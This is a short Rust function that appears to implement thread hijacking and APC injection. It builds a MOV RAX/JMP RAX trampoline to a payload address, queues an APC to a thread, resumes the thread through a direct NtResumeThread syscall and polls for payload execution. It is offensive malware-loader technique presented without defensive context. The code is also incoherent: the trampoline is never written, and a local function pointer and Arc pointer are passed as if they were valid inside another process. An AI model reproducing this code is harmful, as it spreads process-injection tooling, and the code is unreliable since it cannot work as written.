use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};
use std::ptr::null_mut;
use winapi::um::winnt::{HANDLE, PVOID, ULONG, NT_SUCCESS};
use winapi::um::processthreadsapi::QueueUserAPC;
use syscall::syscall;

fn jmp_hijack_thread(h_thread: HANDLE, p_address: PVOID, h_process: HANDLE) -> Result<(), String> {
    unsafe {
        // Construct and write the trampoline directly to a safe memory region in the target process
        let mut trampoline = [
            0x48, 0xB8, // MOV RAX, immediate64
            // placeholder bytes for the address
            0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,
            0xFF, 0xE0  // JMP RAX
        ];
        let p_address_bytes: [u8; 8] = std::mem::transmute(p_address);
        trampoline[2..10].copy_from_slice(&p_address_bytes);

        // Your method to write the trampoline into the target process should be implemented here.
        // This example assumes the trampoline is already placed correctly in the process's memory.

        // Execute the payload using APC injection
        let apc_executed = Arc::new(Mutex::new(false));
        let apc_executed_clone = Arc::clone(&apc_executed);
        extern "system" fn apc_stub(apc_executed_ptr: PVOID) {
            let apc_executed = unsafe { Arc::from_raw(apc_executed_ptr as *const Mutex<bool>) };
            let mut executed = apc_executed.lock().unwrap();
            *executed = true;
            // Do not forget to drop the Arc here if you decide to reconstruct it from raw
        }
        
        let apc_function: PVOID = apc_stub as *mut _ as PVOID;
        QueueUserAPC(Some(std::mem::transmute(apc_function)), h_thread, Arc::into_raw(apc_executed) as PVOID);

        // Resume the suspended thread
        let status_resume = syscall!("NtResumeThread", h_thread, null_mut::<ULONG>());
        if !NT_SUCCESS(status_resume) {
            return Err(format!("[!] Failed to resume thread with NTSTATUS: {:#X}", status_resume));
        }

        // Wait for the payload execution to complete with timeout
        let timeout_duration = Duration::from_secs(5);
        let start_time = Instant::now();
        while !*apc_executed_clone.lock().unwrap() {
            if start_time.elapsed() > timeout_duration {
                return Err("[!] Timeout waiting for payload execution".into());
            }
            std::thread::sleep(Duration::from_millis(10));
        }
    }

    Ok(())
}